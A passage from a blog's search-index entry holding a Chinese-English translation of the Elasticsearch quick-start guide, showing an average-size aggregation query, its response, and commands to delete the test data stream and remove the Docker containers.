class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;aggs&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;average_response_size&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;avg&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;field&quot;</span>: <span class="string">&quot;http.response.body.bytes&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@timestamp&quot;</span>: &#123;</span><br><span class="line">              <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;2099-05-05&quot;</span>,</span><br><span class="line">              <span class="string">&quot;lt&quot;</span>: <span class="string">&quot;2099-05-08&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;fields&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;@timestamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http.response.body.bytes&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;_source&quot;</span>: false,</span><br><span class="line">  <span class="string">&quot;sort&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;@timestamp&quot;</span>: <span class="string">&quot;desc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应的 <code>aggregations</code> 对象包含聚合结果。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">&quot;aggregations&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;average_response_size&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;value&quot;</span> : 12368.0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="更多搜索技巧"><a href="#更多搜索技巧" class="headerlink" title="更多搜索技巧"></a>更多搜索技巧</h3><p>To keep exploring, index more data to your data stream and check out <a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.17/search-your-data.html#common-search-options">Common search options</a>.</p>
<h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>完成后，请删除您的测试数据流及其支持的索引。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> _data_stream/logs-my_app-<span class="keyword">default</span></span><br></pre></td></tr></table></figure>

<p>您还可以删除您的测试部署。</p>
<blockquote>
<p>To stop your Elasticsearch and Kibana Docker containers, run:<br>要停止您的Elasticsearch和Kibana Docker容器，请运行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stop es01-test</span><br><span class="line">docker stop kib01-test</span><br></pre></td></tr></table></figure>



<p>To remove the containers and their network, run:<br>要删除容器及其网络，请运行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker network rm elastic</span><br><span class="line">docker rm es01-test</span><br><span class="line">docker rm kib01-test</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Elastic</tag>
      </tags>
  </entry>
</search>
